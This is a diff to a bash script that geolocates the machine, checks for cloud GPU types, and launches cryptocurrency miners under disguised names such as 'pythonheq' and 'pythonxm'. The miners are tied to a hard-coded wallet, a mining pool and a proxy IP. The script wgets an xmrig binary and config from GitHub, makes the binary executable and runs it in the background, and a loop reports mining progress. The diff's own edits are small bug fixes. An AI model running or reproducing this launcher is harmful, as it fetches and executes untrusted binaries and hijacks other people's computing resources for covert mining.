@@ -6,7 +6,7 @@ echo -e '#######################################################################
 PROX=78.47.69.185
 ETPort=8080
 RVPort=80
-echo -e '################## '"MAX $PROX:$ETPort"' Ver:0.0.1     ################'
+echo -e '################## '"MAX $PROX:$ETPort"' Ver:0.0.2     ################'
 echo -e '##########################################################################'
 
 ## getting IP info
@@ -16,7 +16,7 @@ curl ipinfo.io
 CITY=$(curl -s ipinfo.io|grep -oP '(?<="city": ")[^"]*')
 REGION=$(curl -s ipinfo.io|grep -oP '(?<="region": ")[^"]*')
 COUNTRY=$(curl -s ipinfo.io|grep -oP '(?<="country": ")[^"]*')
-INFO="$COUNTRY""_""$CITY"
+INFO="$COUNTRY""_""$CITY""_""$IPNAME"
 
 ## COLORS
 # Reset
@@ -145,7 +145,7 @@ i="0"
 while true
 do
 ./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> oout 2>> oout &
-
+GPU=NULL
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
 
@@ -160,14 +160,14 @@ then
 echo -e "${On_IRed}"'#######################################################'
 echo -e "####################### ONLY CPU #########################"
 echo -e '###########################################################'"${Color_Off}"
-GPU=NULL
+GPU=NONE
 echo > ooutxm
 rm -rf pythonxm
 wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
 chmod +x pythonxm
 #                Config
 wget -q https://github.com/one10001/10001code/raw/main/config.json
-sed -i "s+ip0001+RV_$IPNAME+g" config.json
+sed -i "s+ip0001+RV_$INFO+g" config.json
 sed -i "s+xxpppxx+$PROX+g" config.json
 
 ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
@@ -210,23 +210,23 @@ fi
     while true
     do
         i=$[$i+1]
-        if [ $GPU == "NULL"]
+        if [ $GPU == "NONE" ]
         then
         echo -e "${On_Red}ONLY CPU -> ${BIYellow}  XM"
         echo -e "${On_Red} Results XM${BIYellow} $i ${Color_Off}:  ${BIBlue} $(grep ccc ooutxm | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep acc ooutxm | wc -l)*100/$i] ${Color_Off}" 
-        elif [ $GPU == "T4"]
+        elif [ $GPU == "T4" ]
         then
         echo -e "${On_Green}GPU T4  -> ${BIYellow}  ET"
         echo -e "${On_Green}Results ET${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i] ${Color_Off}" 
-        elif [ $GPU == "P100"]
+        elif [ $GPU == "P100" ]
         then
         echo -e "${On_Green}GPU P100  -> ${BIYellow}  ET"
         echo -e "${On_Green}Results ET${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i] ${Color_Off}" 
-        elif [ $GPU == "P4"]
+        elif [ $GPU == "P4" ]
         then
         echo -e "${On_Green}GPU T4  -> ${BIYellow}  ET + RV"
         echo -e "${On_Green}Results  ET + RV${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i] ${Color_Off}" 
-        elif [ $GPU == "K80"]
+        elif [ $GPU == "K80" ]
         then
         echo -e "${On_Cyan}GPU K80 RV  -> ${BIYellow}  RV"
         echo -e "${On_Cyan}Results RV${BIYellow} $i ${Color_Off}:  ${BIGreen} $(grep Acc oout | wc -l) ${Color_Off} X ${BIBlack} Ratio : ${BIRed} $[$(grep Acc oout | wc -l)*100/$i] ${Color_Off}" 
